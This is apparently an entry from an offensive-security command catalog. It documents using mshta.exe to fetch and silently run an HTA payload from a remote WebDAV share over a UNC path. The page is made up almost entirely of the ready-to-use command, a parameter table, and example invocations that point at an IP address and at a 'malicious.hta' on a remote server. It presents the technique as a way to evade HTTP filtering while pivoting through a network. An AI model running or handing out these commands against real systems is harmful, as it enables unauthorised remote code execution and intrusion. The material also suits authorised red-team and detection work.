---
id: 23c4bd1f-933a-499a-abc6-d36d6909fcf6
name: Execute-HTA-Payload-via-WebDAV
type: command
executor: cmd
data: mshta \\$_WEBSERVER\\$_SHARE\\payload.hta
output: null
created_at: '2023-04-06T03:56:26.859152+00:00'
updated_at: '2023-04-10T20:37:11.492312+00:00'
platforms:
  - Windows
tags:
  - mshta
  - webdav
  - execution
verified: true
validated: true
---

# Execute-HTA-Payload-via-WebDAV

## Command

```cmd
mshta \\$_WEBSERVER\\$_SHARE\\payload.hta
```

## Description

This command uses mshta.exe to access and execute an HTA file via a WebDAV UNC path, simulating legitimate file share access. It is effective for internal network pivoting where HTTP is filtered but SMB/WebDAV is permitted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_WEBSERVER | WebDAV server hostname or IP (e.g., webdavserver) | Yes |
| $_SHARE | Share or folder path (e.g., folder) | Yes |
| payload.hta | Fixed filename of the HTA payload | Yes |

## Examples

### Basic Usage

```cmd
mshta \\192.168.1.100\share\payload.hta
```

### Advanced Usage

```cmd
mshta \\webdavserver.domain.com\public\malicious.hta
```

## Expected Output

No direct output; execution is silent if successful, with payload effects visible (e.g., command execution). Authentication may prompt if not anonymous; errors include "Access denied" or "Path not found."

## Related

- [[procedures/Mshta-Remote-HTA-Execution]]
- [[commands/Execute-HTA-Payload-via-HTTP]]
